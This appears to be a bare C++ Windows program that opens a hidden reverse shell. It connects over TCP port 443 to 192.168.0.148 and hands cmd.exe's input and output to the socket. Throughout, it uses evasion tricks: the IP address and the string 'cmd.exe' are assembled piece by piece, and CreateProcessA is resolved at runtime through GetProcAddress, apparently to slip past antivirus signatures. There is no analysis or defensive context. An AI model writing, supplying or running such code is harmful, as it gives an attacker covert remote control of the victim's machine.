#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    sockaddr_in server;


    const char* ip[] = { "192", ".", "168", ".", "0", ".", "148" };
    char ip_str[16] = "";
    for (int i = 0; i < 7; i++) {
        strcat(ip_str, ip[i]);
    }

    char cmd[8];
    cmd[0] = 'c';
    cmd[1] = 'm';
    cmd[2] = 'd';
    cmd[3] = '.';
    cmd[4] = 'e';
    cmd[5] = 'x';
    cmd[6] = 'e';
    cmd[7] = '\0';


    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(443);
    server.sin_addr.s_addr = inet_addr(ip_str);

    connect(sock, (sockaddr*)&server, sizeof(server));

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    si.wShowWindow = SW_HIDE;

    HMODULE h = LoadLibraryA("kernel32.dll");
    FARPROC create_proc = GetProcAddress(h, "CreateProcessA");

    ((decltype(&CreateProcessA))create_proc)(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    return 0;
}

